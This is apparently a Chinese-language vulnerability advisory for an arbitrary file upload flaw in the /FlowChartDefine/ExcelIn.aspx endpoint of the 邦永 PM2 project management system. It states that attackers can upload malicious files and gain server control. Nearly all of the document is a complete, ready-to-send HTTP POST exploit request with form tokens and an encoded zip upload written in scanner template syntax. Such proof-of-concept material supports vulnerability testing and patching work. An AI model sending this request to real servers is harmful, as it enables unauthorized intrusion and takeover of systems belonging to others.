**漏洞描述：**

邦永PM2项目管理系统/FlowChartDefine/ExcelIn.aspx接口存在任意文件上传漏洞，攻击者可以上传恶意文件获取服务器权限。

**影响版本：**

邦永PM2项目管理平台

**Payload：**

```jsx
POST /FlowChartDefine/ExcelIn.aspx HTTP/1.1
Host: host
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAU4uQKbpWhA7eME3
Cookie: ASP.NET_SessionId=oewffeov54f2dfj3iyz2u1qp
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Cache-Control: max-age=0
Accept-Encoding: gzip, deflate
Content-Length: 1470

- -----WebKitFormBoundaryAU4uQKbpWhA7eME3
Content-Disposition: form-data; name="__VIEWSTATE"

U6iRl9SqWWlhjIPJXIeFrsinqYAmYxenxFiyfWFMfWgnw3OtkceDLcdfRvB8pmUNGk44PvjZ6LlzPwDbJGmilsmhuX9LvOiuKadYa9iDdSipLW5JvUHjS89aGzKqr9fhih+p+/Mm+q2vrknhfEJJnQ==
- -----WebKitFormBoundaryAU4uQKbpWhA7eME3
Content-Disposition: form-data; name="__VIEWSTATEGENERATOR"

FD259C0F
- -----WebKitFormBoundaryAU4uQKbpWhA7eME3
Content-Disposition: form-data; name="__EVENTVALIDATION"

/pKblUYGQ+ibKtw4CCS2wzX+lmZIOB+x5ezYw0qJFbaUifUKlxNNRMKceZYgY/eAUUTaxe0gSvyv/oA8lUS7G7jPVqqrMEzYBVBl8dRkFWFwMqqjv1G9gXM/ZnIpnVSL
- -----WebKitFormBoundaryAU4uQKbpWhA7eME3
Content-Disposition: form-data; name="FileUpload1"; filename="1234.zip"
Content-Type: application/x-zip-compressed

{{unquote("PK\x03\x04\x14\x00\x01\x00\x00\x00\xefl\xfaX\x1c:\xf5\xcb\x11\x00\x00\x00\x05\x00\x00\x00\x08\x00\x00\x001234.txt\xb0\x0c\x01\x08\xd1!\xd1Uv \xfal\x9b\xf4Q\xfd\xf8PK\x01\x02?\x00\x14\x00\x01\x00\x00\x00\xefl\xfaX\x1c:\xf5\xcb\x11\x00\x00\x00\x05\x00\x00\x00\x08\x00$\x00\x00\x00\x00\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x001234.txt\x0a\x00 \x00\x00\x00\x00\x00\x01\x00\x18\x00\x05\x8d\x9d.\x1e\xdf\xda\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00PK\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00Z\x00\x00\x007\x00\x00\x00\x00\x00")}}
- -----WebKitFormBoundaryAU4uQKbpWhA7eME3
Content-Disposition: form-data; name="Button1"

模块导入
- -----WebKitFormBoundaryAU4uQKbpWhA7eME3--
```
```
